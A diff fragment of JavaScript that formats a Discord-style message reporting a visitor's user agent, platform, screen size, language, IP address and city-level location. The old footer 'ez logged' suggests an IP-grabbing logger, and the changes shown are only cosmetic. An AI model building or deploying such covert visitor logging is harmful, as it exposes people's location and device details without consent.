@@ -143,22 +143,23 @@
                                 color: 3447003,  // You can change the color code
                                 fields: [
                                     {
-                                        name: "Device Information",                                
+                                        name: "Device Information",
                                         value: `
                                         
                                         **User Agent:** ${deviceInfo.userAgent}
+
                                         **Platform:** ${deviceInfo.platform}
-                                        **Screen Width:** ${deviceInfo.screenWidth}
-                                        **Screen Height:** ${deviceInfo.screenHeight}
+                                        **Screen Resolution:** ${deviceInfo.screenWidth} x ${deviceInfo.screenHeight}
                                         **Language:** ${deviceInfo.language}
                                         `,
                                         inline: false
                                     },
                                     {
-                                        name: "IP Information",                             
+                                        name: "IP Information",
                                         value: `
                                         
                                         **IP Address:** ${geoInfo.ip}
+
                                         **Country:** ${countryName} (${geoInfo.countryCode})
                                         **Region:** ${geoInfo.region}
                                         **City:** ${geoInfo.city}
@@ -172,7 +173,7 @@
                                     url: flagURL // Displays the country flag
                                 },
                                 footer: {
-                                    text: "ez logged"
+                                    text: "Information fetched using ipinfo.io and restcountries.com"
                                 },
                                 timestamp: new Date()  // Adds the timestamp
                             }]
